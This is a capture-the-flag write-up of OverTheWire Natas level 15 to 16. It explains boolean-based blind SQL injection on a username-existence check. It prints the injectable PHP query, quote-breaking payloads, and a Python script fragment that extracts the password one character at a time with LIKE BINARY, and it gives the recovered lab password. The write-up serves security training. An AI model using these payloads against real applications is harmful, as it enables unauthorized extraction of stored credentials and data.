# Natas — Level 15 → 16

**Category:** OverTheWire / Natas  
**Difficulty:** Medium  
**Date:** 2026-08-23

## Goal

No password field this time — just a username, and a yes/no answer:

![natas15 page with a Username field and "Check existence" button](images/natas-15-16-page.png)

## Solution

The source showed the query again used raw concatenation, but this time the response only ever says whether a user exists or not — no data is ever echoed back directly:

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    ...
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }

![Source showing the username-only query and the exists/doesn't-exist branches](images/natas-15-16-source.png)

That's a classic boolean-based blind injection: no direct data leak, but the true/false response itself is the oracle. Confirmed the baseline first:

    Username: natas16

    This user exists.

![Username field with natas16](images/natas-15-16-baseline-input.png)
![Result: This user exists](images/natas-15-16-baseline-result.png)

Then broke out of the quotes with an always-true condition:

    Username: natas16" AND 1=1 #

    This user exists.

![Username field with natas16" AND 1=1 #](images/natas-15-16-true-input.png)
![Result: This user exists](images/natas-15-16-true-result.png)

And an always-false one, to confirm the injection point actually controls the result rather than `natas16` alone always returning true:

    Username: natas16" AND 1=10 #

    This user doesn't exist.

![Username field with natas16" AND 1=10 #](images/natas-15-16-false-input.png)
![Result: This user doesn't exist](images/natas-15-16-false-result.png)

With the true/false oracle confirmed, scripted a request to make sure automation worked the same way manual testing did:

    payload = 'natas16" AND 1=1 #'
    r = requests.post(url, auth=auth, data={"username": payload})

![test.py sending the AND 1=1 payload via requests](images/natas-15-16-testpy.png)
![Running test.py, response confirms "This user exists."](images/natas-15-16-testpy-run.png)

From there, built a full blind extraction script: for each position in the password, try every character, and ask MySQL whether the real password starts with the guess-so-far plus that character — `LIKE BINARY` keeps the comparison case-sensitive:

    payload = f'natas16" AND password LIKE BINARY "{candidate}%" #'

    if "This user exists." in r.text:
        password = candidate

![solve.py brute-forcing the password one character at a time with LIKE BINARY](images/natas-15-16-solvepy.png)

Ran it and watched the password build up one confirmed character at a time until all 32 characters were recovered:

    Password: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb

![Terminal output showing the password built character by character to completion](images/natas-15-16-solvepy-run.png)

## Result

    Password for natas16: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb

## Key Takeaway

Removing the direct data leak doesn't remove the injection — a query that only ever says "yes" or "no" is still a full oracle. Any condition can be smuggled into that yes/no answer, including `password LIKE BINARY "guess%"`, which turns a boolean-blind endpoint into a character-by-character way to exfiltrate data that was never meant to be returned at all.
